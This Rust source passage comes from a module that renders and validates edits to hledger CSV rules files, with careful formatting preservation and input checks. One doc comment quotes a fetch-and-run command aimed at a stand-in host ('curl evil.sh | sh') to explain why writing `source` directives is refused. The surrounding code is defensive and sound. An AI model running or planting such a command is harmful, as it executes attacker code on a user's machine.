    Classified::opaque(OpaqueReason::Unclassified)
}

// ---------------------------------------------------------------------------
// Rendering — leaf splicing, not pretty-printing
// ---------------------------------------------------------------------------

/// The separator an *inserted* `fields` list writes between names, and the
/// fallback when an edited list has fewer than two names to observe one from.
/// `", "` is what every rules file in the wild uses; hledger accepts any spacing
/// around the comma.
const FIELD_LIST_SEPARATOR: &str = ", ";

/// The indent an *inserted* conditional block gives its assignments.
///
/// A replaced block reuses [`IfBlock::indent`], the block's own leading
/// whitespace, so nothing is normalized. A brand-new block has no such thing to
/// reuse, and hledger only requires "at least one space or tab", so this is a
/// convention rather than a rule: four spaces, matching the rules files this
/// project ships. Nothing downstream depends on the width.
const INSERTED_BLOCK_INDENT: &str = "    ";

/// What an *added* AND-continuation line is prefixed with.
///
/// hledger accepts `&PATTERN` with no gap (verified against 1.52), so the space
/// is convention, matching how every rules file in the wild writes one. A
/// continuation line the file already had keeps its own bytes instead — see
/// [`RulesDoc::render_if_block`].
const AND_PREFIX: &str = "& ";

/// A conditional block's matchers, flattened into file order, each paired with
/// **whether it starts its OR-group**.
///
/// One matcher per line is what the renderer walks; the flag is the whole of
/// what that line's `&` prefix says, and it is the only thing grouping
/// contributes to rendering. Generic because the parsed ([`MatcherGroup`]) and
/// the edited ([`MatcherGroupSpec`]) sides are walked in lockstep, and a second
/// copy of this would be free to disagree with the first.
fn flatten<'a, G: 'a, M: 'a>(
    groups: &'a [G],
    matchers: impl Fn(&'a G) -> &'a [M] + Copy,
) -> impl Iterator<Item = (bool, &'a M)> {
    groups.iter().flat_map(move |group| {
        matchers(group)
            .iter()
            .enumerate()
            .map(|(at, matcher)| (at == 0, matcher))
    })
}

/// Append `line` plus a terminator, starting a new line first if the buffer is
/// mid-line.
///
/// Needed because a block's last original line may end at EOF with no
/// terminator: appending an added matcher or assignment to it would otherwise
/// splice two rules into one.
fn push_line(out: &mut String, line: &str, newline: &str) {
    if !out.is_empty() && !out.ends_with('\n') {
        out.push_str(newline);
    }
    out.push_str(line);
    out.push_str(newline);
}

/// A rendered body always ends with the document's *detected* terminator, so a
/// CRLF file stays CRLF and an item that ended the file without one gains it.
fn ensure_terminated(mut text: String, newline: Newline) -> String {
    if !text.ends_with('\n') {
        text.push_str(newline.as_str());
    }
    text
}

/// The [`Directive`] a loaded item carries, if it is one.
///
/// `None` covers both "there is no loaded item" (an insert) and "the loaded item
/// is a different construct" (a replace that changes what the item *is*). Both
/// render from scratch, because neither has leaves to splice against.
fn loaded_directive(item: Option<&Item>) -> Option<&Directive> {
    match &item?.kind {
        ItemKind::Directive(directive) => Some(directive),
        _ => None,
    }
}

/// The [`Fields`] a loaded item carries, with the item — the item is needed
/// because a `fields` line's `fields`/`:`/whitespace prefix has no span of its
/// own and is found from the body's start.
fn loaded_fields(item: Option<&Item>) -> Option<(&Item, &Fields)> {
    let item = item?;
    match &item.kind {
        ItemKind::Fields(fields) => Some((item, fields)),
        _ => None,
    }
}

/// The [`Assignment`] a loaded item carries, if it is one.
fn loaded_assignment(item: Option<&Item>) -> Option<&Assignment> {
    match &item?.kind {
        ItemKind::Assignment(assignment) => Some(assignment),
        _ => None,
    }
}

/// The [`IfBlock`] a loaded item carries, with the item — the item is needed for
/// the body's line extents, which is how an unchanged line is re-emitted whole.
fn loaded_if_block(item: Option<&Item>) -> Option<(&Item, &IfBlock)> {
    let item = item?;
    match &item.kind {
        ItemKind::IfBlock(block) => Some((item, block)),
        _ => None,
    }
}

/// Where a matcher's text begins, `%` included.
///
/// [`Matcher::field_span`] deliberately excludes the `%` so a rename splices only
/// the name; re-emitting the matcher needs the `%` back, and it is always the one
/// character in front.
fn matcher_start(matcher: &Matcher) -> usize {
    matcher
        .field_span
        .as_ref()
        .map_or(matcher.pattern_span.start, |field| {
            field.start - '%'.len_utf8()
        })
}

/// The keyword hledger spells a directive with.
///
/// Public because the HTTP layer has to *name* a directive on the wire, and the
/// only safe name is the one this module's renderer will actually write. A
/// second table there would be free to drift — which is the DRY-3 failure mode
/// exactly: both sides compile, both sides pass, and the file gets a keyword
/// nobody meant.
#[must_use]
pub const fn directive_keyword(name: DirectiveName) -> &'static str {
    match name {
        DirectiveName::Source => "source",
        DirectiveName::Archive => "archive",
        DirectiveName::Encoding => "encoding",
        DirectiveName::Separator => "separator",
        DirectiveName::DecimalMark => "decimal-mark",
        DirectiveName::DateFormat => "date-format",
        DirectiveName::Timezone => "timezone",
        DirectiveName::NewestFirst => "newest-first",
        DirectiveName::IntraDayReversed => "intra-day-reversed",
        DirectiveName::Skip => "skip",
        DirectiveName::BalanceType => "balance-type",
    }
}

/// The text a [`BalanceType`] is written as.
#[must_use]
pub const fn balance_type_text(kind: BalanceType) -> &'static str {
    match kind {
        BalanceType::Simple => "=",
        BalanceType::Inclusive => "=*",
        BalanceType::Total => "==",
        BalanceType::TotalInclusive => "==*",
    }
}

/// The text a [`DirectiveValue`] is written as.
///
/// Empty for a flag and for an absent value, which is exactly how hledger reads
/// a directive written with no value at all.
///
/// Public for the same reason [`directive_keyword`] is: a wire projection of a
/// value must be spelled the way the renderer would spell it, or a client that
/// echoes back what it was shown writes something else.
#[must_use]
pub fn directive_value_text(value: &DirectiveValue) -> String {
    match value {
        DirectiveValue::Source { raw, .. } => raw.clone(),
        DirectiveValue::Flag => String::new(),
        DirectiveValue::Text(text) => text.clone(),
        DirectiveValue::Separator(Separator::Char(mark)) | DirectiveValue::DecimalMark(mark) => {
            mark.to_string()
        }
        DirectiveValue::Separator(Separator::Tab { raw } | Separator::Space { raw }) => raw.clone(),
        DirectiveValue::Skip(count) => count.to_string(),
        DirectiveValue::BalanceType(kind) => balance_type_text(*kind).to_string(),
    }
}

/// The name hledger spells an [`HledgerField`] with.
///
/// The inverse of [`hledger_field`], and public alongside it so a wire layer can
/// round-trip a field name through this module's own vocabulary rather than a
/// copy of it.
#[must_use]
pub fn field_name_text(field: HledgerField) -> String {
    match field {
        HledgerField::Date => "date".to_string(),
        HledgerField::Date2 => "date2".to_string(),
        HledgerField::Status => "status".to_string(),
        HledgerField::Code => "code".to_string(),
        HledgerField::Description => "description".to_string(),
        HledgerField::Comment => "comment".to_string(),
        HledgerField::Amount => "amount".to_string(),
        HledgerField::AmountIn => "amount-in".to_string(),
        HledgerField::AmountOut => "amount-out".to_string(),
        HledgerField::Currency => "currency".to_string(),
        HledgerField::Balance => "balance".to_string(),
        HledgerField::Control(ControlField::Skip) => "skip".to_string(),
        HledgerField::Control(ControlField::End) => "end".to_string(),
        HledgerField::Numbered { base, n } => match base {
            NumberedField::Account => format!("account{n}"),
            NumberedField::Amount => format!("amount{n}"),
            NumberedField::AmountIn => format!("amount{n}-in"),
            NumberedField::AmountOut => format!("amount{n}-out"),
            NumberedField::Comment => format!("comment{n}"),
            NumberedField::Currency => format!("currency{n}"),
            NumberedField::Balance => format!("balance{n}"),
        },
    }
}

impl RulesDoc {
    /// Render one item's body from typed fields, splicing every leaf that did
    /// not change.
    ///
    /// `loaded` is the item being replaced, or `None` for an insert. A replace
    /// whose [`ItemBody`] names a *different* construct than the loaded item is
    /// legal and renders from scratch: there are no corresponding leaves to
    /// splice, so there is nothing to preserve beyond the surrounding runs,
    /// which [`RulesDoc::render_slot`] keeps either way.
    fn render_body(&self, loaded: Option<&Item>, body: &ItemBody) -> Result<String, RulesError> {
        let text = match body {
            ItemBody::Directive { name, value } => {
                self.render_directive(loaded_directive(loaded), *name, value)?
            }
            ItemBody::Fields { names } => self.render_fields(loaded_fields(loaded), names),
            ItemBody::Assignment { field, value } => {
                self.render_assignment(loaded_assignment(loaded), *field, value)
            }
            ItemBody::IfBlock {
                groups,
                assignments,
            } => self.render_if_block(loaded_if_block(loaded), groups, assignments),
        };
        Ok(ensure_terminated(text, self.newline))
    }

    /// `[keyword][the file's own separator][value]`.
    ///
    /// The keyword, any `:` and the whitespace between them are the file's
    /// bytes; only a leaf that changed is re-rendered. A directive written with
    /// **no value at all** has no separator to reuse, so a new value gets the one
    /// space hledger's `directivep` needs — synthesizing that space is the
    /// difference between `date-format %Y` and an unreadable `date-format%Y`.
    ///
    /// # Errors
    /// [`RulesError::Invalid`] if the line this produces does not read back as
    /// the directive it was given. That render→parse fixpoint is cheap, total,
    /// and catches every name/value pairing the caller could get wrong —
    /// `separator` given a two-character value, `decimal-mark` given `..`, a flag
    /// keyword given a `Skip` count.
    fn render_directive(
        &self,
        loaded: Option<&Directive>,
        name: DirectiveName,
        value: &DirectiveValue,
    ) -> Result<String, RulesError> {
        let keyword = directive_keyword(name);
        let line = match loaded {
            Some(directive) => {
                let head = if directive.name == name {
                    &self.text[directive.name_span.clone()]
                } else {
                    keyword
                };
                let separator = &self.text[directive.name_span.end..directive.value_span.start];
                // The typed value, not the span text, decides "unchanged": a
                // `skip 1 ` really does parse to `Skip(1)`, and re-rendering it
                // would silently drop a trailing space nobody asked about.
                let tail = if directive.value == *value {
                    self.text[directive.value_span.clone()].to_string()
                } else {
                    directive_value_text(value)
                };
                if separator.is_empty() && !tail.is_empty() {
                    format!("{head} {tail}")
                } else {
                    format!("{head}{separator}{tail}")
                }
            }
            None => match directive_value_text(value) {
                tail if tail.is_empty() => keyword.to_string(),
                tail => format!("{keyword} {tail}"),
            },
        };

        match classify_directive(&line, 0) {
            Some(Ok(directive)) if directive.name == name && directive.value == *value => Ok(line),
            _ => Err(RulesError::Invalid(format!(
                "the directive would be written as {line:?}, which does not read back as the value it was given"
            ))),
        }
    }

    /// A `fields` list.
    ///
    /// Same arity: splice name by name. Every comma, every space between names,
    /// the `fields`/`:` prefix and the trailing text all stay the bytes the file
    /// already had.
    ///
    /// Different arity: there is no name-by-name correspondence left, so the list
    /// is re-rendered with **the separator style observed between the file's own
    /// first two names** — a file written `fields a,b` keeps its tight commas.
    /// The prefix and the trailing text are still the file's bytes; dropping the
    /// trailing text would be silent data loss.
    fn render_fields(&self, loaded: Option<(&Item, &Fields)>, names: &[String]) -> String {
        let fresh = || format!("fields {}", names.join(FIELD_LIST_SEPARATOR));
        let Some((item, fields)) = loaded else {
            return fresh();
        };
        let Some(first) = fields.name_spans.first() else {
            return fresh();
        };
        let head = &self.text[item.body.start..first.start];
        let tail = &self.text[fields.tail_span.clone()];
        // A name equals its span's text byte for byte, so writing an unchanged
        // name IS re-emitting its original bytes; there is nothing to branch on.
        let mut gaps = fields
            .name_spans
            .windows(2)
            .map(|pair| &self.text[pair[0].end..pair[1].start]);
        if names.len() == fields.names.len() {
            let spliced = names
                .iter()
                .map(String::as_str)
                .interleave(gaps)
                .collect::<String>();
            return format!("{head}{spliced}{tail}");
        }
        let separator = gaps.next().unwrap_or(FIELD_LIST_SEPARATOR);
        format!("{head}{}{tail}", names.join(separator))
    }

    /// `[field][the file's own separator][value]`.
    ///
    /// Reusing the separator verbatim is the entire reason a column-aligned rules
    /// file stays aligned with no alignment code anywhere. A **field rename**
    /// therefore shifts its own line's column by the difference in name length
    /// and leaves every neighbour alone: re-padding one line would misalign the
    /// lines this module is contractually not touching.
    ///
    /// An empty value renders as the bare field name with no separator, which is
    /// the form hledger's `fieldassignmentp` reads as assigning `""` — unless the
    /// value was already empty, in which case nothing about the value leaf
    /// changed and the file's own separator stands. Preserving beats normalizing.
    fn render_assignment(
        &self,
        loaded: Option<&Assignment>,
        field: HledgerField,
        value: &str,
    ) -> String {
        let name = loaded
            .filter(|assignment| assignment.field == field)
            .map_or_else(
                || field_name_text(field),
                |assignment| self.text[assignment.field_span.clone()].to_string(),
            );
        if value.is_empty() {
            // The one exception to "an empty value is a bare field name": a
            // value that was ALREADY empty did not change, so the line's
            // separator — a `:` the user chose to write — is not ours to remove.
            return match loaded {
                Some(assignment) if assignment.value_span.is_empty() => {
                    format!("{name}{}", &self.text[assignment.sep_span.clone()])
                }
                _ => name,
            };
        }
        // A bare field name has no separator to reuse; one space is the least
        // hledger accepts, and inventing more would be inventing alignment.
        let separator = loaded
            .map(|assignment| &self.text[assignment.sep_span.clone()])
            .filter(|separator| !separator.is_empty())
            .unwrap_or(" ");
        format!("{name}{separator}{value}")
    }

    /// A conditional block, line by line.
    ///
    /// The layout ([`IfLayout`]) is preserved **as found**, even when the matcher
    /// count changes: a stacked block that gains a matcher stays stacked, and an
    /// inline one stays inline. Each original line is re-emitted whole unless a
    /// leaf on it changed, which is what keeps an untouched assignment's indent,
    /// its column alignment and any trailing whitespace exactly as written.
    ///
    /// Added matchers go at column 1 directly below the last matcher the file
    /// already had — the one place hledger's grammar allows another one — and
    /// carry an [`AND_PREFIX`] when they continue a group rather than start one,
    /// so "+ AND condition" and "+ OR group" land on the same line and differ
    /// only by that prefix. Added assignments go at the end, indented with
    /// [`IfBlock::indent`], the block's own leading whitespace. Removed matchers
    /// and assignments take their whole lines with them.
    ///
    /// A matcher's *prefix* — a stacked line's nothing, an inline header's
    /// `if `, a continuation's own `& `/`&\t` — is spliced from the file
    /// verbatim while the line keeps its OR-group role. Only a matcher whose
    /// role changed gets a new prefix, which is the one thing grouping can
    /// change about a line that already exists.
    fn render_if_block(
        &self,
        loaded: Option<(&Item, &IfBlock)>,
        groups: &[MatcherGroupSpec],
        assignments: &[(HledgerField, String)],
    ) -> String {
        let Some((item, block)) = loaded else {
            return self.fresh_if_block(groups, assignments);
        };
        let newline = self.newline.as_str();
        let lines = line_spans(&self.text[item.body.clone()], item.body.start);
        let loaded_matchers = flatten(&block.groups, |group| group.matchers.as_slice())
            .collect::<Vec<(bool, &Matcher)>>();
        let specs = flatten(groups, |group| group.matchers.as_slice())
            .collect::<Vec<(bool, &MatcherSpec)>>();
        // A classified block always has at least one matcher (rule 7), so the
        // saturation is unreachable rather than meaningful.
        let last_matcher = loaded_matchers.len().saturating_sub(1);

        let mut out = String::new();
        for (at, line) in lines.iter().enumerate() {
            // An inline block's first matcher shares the `if` line; a stacked
            // one's header carries nothing but the keyword.
            let matcher = if at == 0 {
                (block.layout == IfLayout::Inline).then_some(0)
            } else {
                loaded_matchers
                    .iter()
                    .position(|(_, matcher)| line.contains(&matcher_start(matcher)))
            };

            if let Some(index) = matcher {
                // A matcher line that has no replacement is one the new, shorter
                // list dropped, so the line goes with it. The header line is
                // never one of those: `check_body` refuses an empty matcher
                // list, so index 0 always has a replacement.
                if let (Some((was_head, loaded)), Some((is_head, spec))) =
                    (loaded_matchers.get(index), specs.get(index))
                {
                    // Index 0 heads the first group on both sides, so the `if `
                    // of an inline header is never what the mismatch branches
                    // rewrite.
                    let prefix = if was_head == is_head {
                        &self.text[line.start..matcher_start(loaded)]
                    } else if *is_head {
                        ""
                    } else {
                        AND_PREFIX
                    };
                    out.push_str(prefix);
                    out.push_str(&self.render_matcher(Some(loaded), spec));
                    out.push_str(&self.text[loaded.pattern_span.end..line.end]);
                }
            } else if let Some(index) = block
                .assignments
                .iter()
                .position(|assignment| line.contains(&assignment.field_span.start))
            {
                if let (Some(loaded), Some((field, value))) =
                    (block.assignments.get(index), assignments.get(index))
                {
                    out.push_str(&self.text[line.start..loaded.field_span.start]);
                    out.push_str(&self.render_assignment(Some(loaded), *field, value));
                    out.push_str(&self.text[loaded.value_span.end..line.end]);
                }
            } else {
                // A stacked block's bare `if` header, or a whitespace-only line
                // hledger consumes as a no-op. Neither carries a leaf to change.
                out.push_str(&self.text[line.clone()]);
            }

            if matcher == Some(last_matcher) {
                for (is_head, spec) in specs.iter().skip(loaded_matchers.len()) {
                    push_line(&mut out, &self.and_line(*is_head, spec), newline);
                }
            }
        }

        let indent = &self.text[block.indent.clone()];
        for (field, value) in assignments.iter().skip(block.assignments.len()) {
            let assignment = self.render_assignment(None, *field, value);
            push_line(&mut out, &format!("{indent}{assignment}"), newline);
        }
        out
    }

    /// A brand-new conditional block.
    ///
    /// Inline layout, because `if MATCHER` is what a one-matcher block looks like
    /// in every rules file anyone writes; further matchers stack below it, each
    /// a group head at column 1 or an [`AND_PREFIX`] continuation.
    fn fresh_if_block(
        &self,
        groups: &[MatcherGroupSpec],
        assignments: &[(HledgerField, String)],
    ) -> String {
        let newline = self.newline.as_str();
        let mut out = String::new();
        let mut rendered = flatten(groups, |group| group.matchers.as_slice());
        // The very first matcher heads the very first group, so it never needs a
        // prefix of its own — the `if` is its prefix.
        match rendered.next() {
            Some((_, first)) => {
                push_line(
                    &mut out,
                    &format!("if {}", self.render_matcher(None, first)),
                    newline,
                );
            }
            None => push_line(&mut out, "if", newline),
        }
        for (is_head, spec) in rendered {
            push_line(&mut out, &self.and_line(is_head, spec), newline);
        }
        for (field, value) in assignments {
            let assignment = self.render_assignment(None, *field, value);
            push_line(
                &mut out,
                &format!("{INSERTED_BLOCK_INDENT}{assignment}"),
                newline,
            );
        }
        out
    }

    /// A **new** matcher's whole line: the matcher at column 1 if it starts an
    /// OR-group, or [`AND_PREFIX`]-ed if it continues the one above.
    ///
    /// Column 1 either way, because that is the only column hledger's grammar
    /// allows: an indented `& X` is not a matcher line at all and hledger 1.52
    /// rejects the file for it, verified against the binary.
    fn and_line(&self, is_head: bool, spec: &MatcherSpec) -> String {
        let matcher = self.render_matcher(None, spec);
        if is_head {
            matcher
        } else {
            format!("{AND_PREFIX}{matcher}")
        }
    }

    /// `%FIELD PATTERN` or a bare `PATTERN`.
    ///
    /// A [`Matcher`]'s `pattern` and its `MatchScope::Field` name each equal
    /// their span's text byte for byte, so writing them back *is* splicing: an
    /// unchanged matcher reproduces its original bytes with no branch. The one
    /// thing that has no typed representation is the whitespace between `%FIELD`
    /// and the pattern, so that is reused from the file when there is one to
    /// reuse.
    fn render_matcher(&self, loaded: Option<&Matcher>, spec: &MatcherSpec) -> String {
        let pattern = &spec.pattern;
        match &spec.scope {
            MatchScope::WholeRecord => pattern.clone(),
            MatchScope::Field(name) => {
                let gap = loaded
                    .and_then(|matcher| {
                        let field = matcher.field_span.as_ref()?;
                        Some(&self.text[field.end..matcher.pattern_span.start])
                    })
                    .filter(|gap| !gap.is_empty())
                    .unwrap_or(" ");
                format!("%{name}{gap}{pattern}")
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Edit policy
// ---------------------------------------------------------------------------

/// May this loaded item's body be rewritten at all?
///
/// | Kind | Keep | Replace | Insert |
/// | --- | --- | --- | --- |
/// | `Trivia`, `Opaque` | yes | **no** | **no** |
/// | `Include` | yes | **no** | **no** |
/// | `Directive` named `source` or `archive` | yes | **no** | **no** |
/// | the other nine directives | yes | yes | yes |
/// | `Fields`, `Assignment`, `IfBlock` | yes | yes | yes |
///
/// `Trivia` and `Opaque` are refused because there is nothing typed to rewrite:
/// a comment run is bytes, and an opaque construct is one this module explicitly
/// declined to promise anything about. `include`, `source` and `archive` are
/// refused for the security reason [`writable`] sets out.
///
/// **Deleting** any of these is still allowed, and moving them is too. Removing
/// a line cannot inject anything, and a permutation writes no new bytes.
///
/// # Errors
/// The refusal, phrased to complete the sentence "item 4 …".
fn replaceable(kind: &ItemKind) -> Result<(), String> {
    match kind {
        ItemKind::Trivia => Err(
            "is a comment or blank run, which has no typed content to rewrite; edit the construct \
             it annotates instead"
                .to_string(),
        ),
        ItemKind::Opaque(opaque) => Err(format!(
            "was not classified ({:?}), so rewriting part of it could change what the rest means; \
             it can be kept, moved or deleted",
            opaque.reason
        )),
        ItemKind::Include(_) => Err(
            "is an `include`, which names another rules file hledger will read; it can be kept, \
             moved or deleted but never rewritten"
                .to_string(),
        ),
        ItemKind::Directive(directive)
            if matches!(
                directive.name,
                DirectiveName::Source | DirectiveName::Archive
            ) =>
        {
            Err(format!(
                "is a `{}` directive, which can be kept, moved or deleted but never rewritten",
                directive_keyword(directive.name)
            ))
        }
        ItemKind::Directive(_)
        | ItemKind::Fields(_)
        | ItemKind::Assignment(_)
        | ItemKind::IfBlock(_) => Ok(()),
    }
}

/// May this content be written into a rules file at all?
///
/// **This is the single most important restriction in the module, and it is a
/// security requirement rather than taste.**
///
/// hledger's `source` directive accepts `| CMD`, and `hledger import` runs that
/// through the user's shell. Without this rule,
/// `Insert(Directive { name: Source, value: "| curl evil.sh | sh" })` turns the
/// later HTTP write endpoint into a remote-code-execution primitive: a request
/// that only *edits a text file* would arrange for arbitrary code to run the
/// next time the user imports. `archive` is refused alongside it because it
/// names a path hledger will **move a file to** on a successful import, so
/// writing one is arranging for a file operation the user did not request.
///
/// `include` needs no entry here: [`ItemBody`] has no variant that can express
/// one, which is the structural half of the same guarantee.
///
/// Deleting a `source` or `archive` line is still allowed — removing a line
/// cannot inject anything — and so is moving one, which writes no new bytes.
///
/// # Errors
/// The refusal, phrased to complete the sentence "a new item …".
fn writable(body: &ItemBody) -> Result<(), String> {
    match body {
        ItemBody::Directive {
            name: name @ (DirectiveName::Source | DirectiveName::Archive),
            ..
        } => Err(format!(
            "may not be a `{}` directive: `source` accepts a `| CMD` form that hledger runs \
             through the shell on import, and `archive` names a path it moves files to. Both can \
             be kept, moved or deleted, never written",
            directive_keyword(*name)
        )),
        ItemBody::Directive { .. }
        | ItemBody::Fields { .. }
        | ItemBody::Assignment { .. }
        | ItemBody::IfBlock { .. } => Ok(()),
    }
}

// ---------------------------------------------------------------------------
// Value validation
// ---------------------------------------------------------------------------

/// Longest value this module will write. Generous next to any real rules file
/// and small enough that a runaway client cannot write a megabyte into one line.
const MAX_VALUE_BYTES: usize = 512;
/// Longest field name — hledger's own longest is `intra-day-reversed`.
const MAX_NAME_BYTES: usize = 64;
/// Longest matcher pattern.
const MAX_PATTERN_BYTES: usize = 256;

/// Reject anything this module will not write into a rules file.
///
/// Runs over **every** client-supplied string in `body`, before any renderer
/// sees one. The checks reject only the shapes that break hledger's *grammar*;
/// regex validity is hledger's to judge, because hledger owns a regex engine and
/// this module deliberately does not.
///
/// # Errors
/// [`RulesError::Invalid`], naming the value and the rule it broke.
fn check_body(body: &ItemBody) -> Result<(), RulesError> {
    match body {
        ItemBody::Directive { value, .. } => check_directive_value(value),
        ItemBody::Fields { names } => check_field_list(names),
        ItemBody::Assignment { field, value } => {
            check_assignment(*field, value, Placement::TopLevel)
        }
        ItemBody::IfBlock {
            groups,
            assignments,
        } => {
            if groups.is_empty() {
                return Err(RulesError::Invalid(
                    "a conditional block needs at least one matcher; hledger rejects one with none"
                        .to_string(),
                ));
            }
            // An empty group would simply vanish when the groups are flattened
            // into lines, silently re-grouping its neighbours; hledger rejects
            // the bare `&` line it would have to be to survive.
            if groups.iter().any(|group| group.matchers.is_empty()) {
                return Err(RulesError::Invalid(
                    "a conditional block's OR-group needs at least one matcher".to_string(),
                ));
            }
            if assignments.is_empty() {
                return Err(RulesError::Invalid(
                    "a conditional block needs at least one assignment; hledger rejects one with \
                     none"
                        .to_string(),
                ));
            }
            groups
                .iter()
                .flat_map(|group| &group.matchers)
                .try_for_each(check_matcher)?;
            assignments
                .iter()
                .try_for_each(|(field, value)| check_assignment(*field, value, Placement::InBlock))
        }
    }
}

/// Where an assignment sits, which changes which field names are legal.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Placement {
    /// A file-level default.
    TopLevel,
    /// Inside a conditional block.
    InBlock,
}

/// No ASCII control character, and no more than `cap` bytes.
///
/// A newline is how one would smuggle a second rule into a one-line item, and
/// every rules construct here is line-oriented, so `\n` and `\r` are the ones
/// that matter. The rest of the ASCII control range goes with them: none of it
/// has a meaning in a rules file, and a `\t` inside a *value* is invisible
/// damage rather than intent. (Non-ASCII exotica such as `U+2028` are left
/// alone: neither this module nor hledger treats them as line breaks.)
fn check_text(what: &str, value: &str, cap: usize) -> Result<(), RulesError> {
    if let Some(control) = value.chars().find(char::is_ascii_control) {
        return Err(RulesError::Invalid(format!(
            "{what} may not contain the control character {control:?}"
        )));
    }
    if value.len() > cap {
        return Err(RulesError::Invalid(format!(
            "{what} is {} bytes; the limit is {cap}",
            value.len()
        )));
    }
    Ok(())
}

/// No `\` followed by a digit.
///
/// A `\N` backreference is meaningless in a group-free conditional block (this
/// module only classifies blocks with no capture group at all) and in a
/// top-level assignment, and hledger errors on it at read time — so writing one
/// would produce a file the user cannot import.
fn check_no_backreference(what: &str, value: &str) -> Result<(), RulesError> {
    if value
        .as_bytes()
        .windows(2)
        .any(|pair| pair[0] == b'\\' && pair[1].is_ascii_digit())
    {
        return Err(RulesError::Invalid(format!(
            "{what} may not contain a `\\N` backreference: there is no capture group for it to \
             refer to, and hledger rejects it"
        )));
    }
    Ok(())
}

/// `[A-Za-z0-9_-]+` — hledger's `barefieldnamep` excludes ` \t\n,;#~`, so this
/// is a safe subset of what it accepts, and it needs no quoting.
fn check_bare_name(what: &str, name: &str) -> Result<(), RulesError> {
    check_text(what, name, MAX_NAME_BYTES)?;
    if name.is_empty()
        || !name
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
    {
        return Err(RulesError::Invalid(format!(
            "{what} must be one or more of A-Z, a-z, 0-9, `_` or `-`; got {name:?}"
        )));
    }
    Ok(())
}

/// A directive's value: its strings must be writable, and the caller's
/// [`RulesDoc::render_directive`] fixpoint then proves the pair reads back.
fn check_directive_value(value: &DirectiveValue) -> Result<(), RulesError> {
    match value {
        DirectiveValue::Source { raw, .. } => check_text("a `source` value", raw, MAX_VALUE_BYTES),
        DirectiveValue::Text(text) => check_text("a directive value", text, MAX_VALUE_BYTES),
        DirectiveValue::Separator(Separator::Tab { raw } | Separator::Space { raw }) => {
            check_text("a `separator` value", raw, MAX_NAME_BYTES)
        }
        // The remaining values are a single char, a count or a fixed token, and
        // the render→parse fixpoint is a stronger check than anything spelled
        // out here: `decimal-mark ..` and `separator ,,` fail it by construction.
        DirectiveValue::Flag
        | DirectiveValue::Separator(Separator::Char(_))
        | DirectiveValue::DecimalMark(_)
        | DirectiveValue::Skip(_)
        | DirectiveValue::BalanceType(_) => Ok(()),
    }
}

/// A `fields` list: at least two names, each empty or bare.
///
/// The two-name minimum is hledger's, verified against the binary in step 3: it
/// rejects a one-name list outright. An **empty** name is legal and means
/// "ignore this column", which is why the emptiness test here is not
/// [`check_bare_name`]'s.
fn check_field_list(names: &[String]) -> Result<(), RulesError> {
    if names.len() < 2 {
        return Err(RulesError::Invalid(format!(
            "a `fields` list needs at least two names; got {}",
            names.len()
        )));
    }
    names.iter().try_for_each(|name| {
        if name.is_empty() {
            return Ok(());
        }
        check_bare_name("a `fields` name", name)
    })
}

/// An assignment's field and value.
///
/// A value may not begin with a space or a tab, for the same reason
/// [`parse_directive`] refuses one: [`RulesDoc::render_assignment`] emits
/// `FIELD` + the separator + the value, and hledger's `fieldassignmentp` then
/// absorbs the leading run into the *separator*. So `account1` with the value
/// `"   x"` would be written as `account1    x` and read back as the value `x`
/// — a value silently different from the one requested, which
/// [`RulesDoc::verify`] cannot catch because the shape and the extent are both
/// exactly what the plan asked for. Nothing is lost by refusing: hledger can
/// never see an assignment value with a leading space, so no rules file can
/// hold one.
fn check_assignment(
    field: HledgerField,
    value: &str,
    placement: Placement,
) -> Result<(), RulesError> {
    check_field(field, placement)?;
    check_text("an assignment value", value, MAX_VALUE_BYTES)?;
    if value.starts_with([' ', '\t']) {
        return Err(RulesError::Invalid(
            "an assignment value may not begin with a space or a tab: hledger reads that run as \
             the separator, so the value would be written and then read back without it"
                .to_string(),
        ));
    }
    check_no_backreference("an assignment value", value)
}

/// A field name a rendered assignment would actually read back as itself.
///
/// - A posting number outside `1..=99` is not an hledger field name at all: its
///   list is built from `show <$> [1..99]`, so `account0` and `account100` are
///   simply not in it.
/// - `skip` is refused everywhere. At top level hledger reads it as the *skip
///   directive*, not an assignment, so writing one would produce an item that is
///   not the construct the caller asked for.
/// - `end` is refused inside a conditional block, where it is control flow —
///   it stops reading records rather than assigning anything, which is the
///   [`OpaqueReason::ControlFlowInBlock`] rule from the other direction.
fn check_field(field: HledgerField, placement: Placement) -> Result<(), RulesError> {
    match field {
        HledgerField::Numbered { n, .. } if !(1..=99).contains(&n) => Err(RulesError::Invalid(
            format!("a posting number must be 1 to 99; got {n}"),
        )),
        HledgerField::Control(ControlField::Skip) => Err(RulesError::Invalid(
            "`skip` is a directive, not a field assignment".to_string(),
        )),
        HledgerField::Control(ControlField::End) if placement == Placement::InBlock => {
            Err(RulesError::Invalid(
                "`end` inside a conditional block is control flow, not an assignment".to_string(),
            ))
        }
        _ => Ok(()),
    }
}

/// A matcher: a scope name hledger can read, and a pattern that does not break
/// its *grammar*.
///
/// The pattern rules reject exactly the shapes that would be read as something
/// other than a plain matcher, and nothing else. Regex syntax is not checked:
/// this module owns no regex engine, and guessing would reject patterns hledger
/// accepts.
///
/// - **Empty, or whitespace-led** — hledger's `regexp` opens with `nonspace`.
/// - **`&`, `!` at the head** — that is an AND/NOT combinator, which turns the
///   block's matchers from an order-independent OR list into a positional chain.
/// - **`;`, `#`, `*` at the head** — hledger reads those as a regex, so writing
///   one would cement a comment-looking line that is not a comment.
/// - **`&&` anywhere** — joins two matchers, same problem.
/// - **An unescaped `(`** — a capture group, which makes `\N` backreferences
///   meaningful and an assignment's value silently dependent on a matcher. `\(`
///   is a literal paren and is fine.
/// - **A whole-record pattern that reads as `%FIELD PATTERN`** — hledger's
///   `try fieldmatcherp <|> recordmatcherp` would scope it to a field, quietly
///   matching something narrower than the caller asked for.
fn check_matcher(spec: &MatcherSpec) -> Result<(), RulesError> {
    if let MatchScope::Field(name) = &spec.scope {
        check_bare_name("a matcher's field name", name)?;
    }
    let pattern = spec.pattern.as_str();
    check_text("a matcher pattern", pattern, MAX_PATTERN_BYTES)?;
    check_no_backreference("a matcher pattern", pattern)?;

    let refuse = |why: &str| Err(RulesError::Invalid(format!("a matcher pattern {why}")));
    match pattern.chars().next() {
        None => return refuse("may not be empty"),
        Some(c) if c.is_whitespace() => return refuse("may not start with whitespace"),
        Some('&' | '!') => {
            return refuse(
                "may not start with `&` or `!`: that is an AND/NOT combinator, and the matchers of \
